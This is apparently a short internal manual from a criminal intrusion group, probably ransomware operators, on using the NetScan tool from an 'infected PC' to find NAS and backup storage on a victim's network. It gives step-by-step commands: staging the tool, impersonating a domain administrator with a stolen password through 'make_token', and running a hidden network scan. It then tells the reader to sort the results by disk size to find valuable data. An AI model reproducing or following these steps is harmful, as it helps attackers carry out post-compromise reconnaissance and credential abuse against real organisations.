A wonderful tool-NetScan-that makes it easy to scout and find NAS/Backup, etc.
Scans networks by range, using the user/admin credentials of the user/admin on whose behalf you run the software.
Outputs the following information:
Hostname, open ports, group/domain membership, total disk capacity, available spheres, device manufacturer, PC/server role

1) Download the NetScan folder to any infected PC. Let's say C:\Programdata\netscan

2) cd C:\programdata\netscan

3) make_token DOMAIN\admin password

4) shell netscan.exe /hide /auto: "result.xml" /config:netscan.xml /range:192.168.0.1-192.168.1.255
Change the range to your range, leave the rest untouched.

5) Keep waiting. When you exit, you will have result.xml file in the folder, just download it onto your computer.

6) Open NetScan on your computer, downloaded file and look at the results in a convenient format.
Sort by disk size, so you will know right away, where the juice is hidden.

Special thanks to Perry for help in finding the datasheet this manual is based on.
Sonic, you can add NetScan to the algorithm
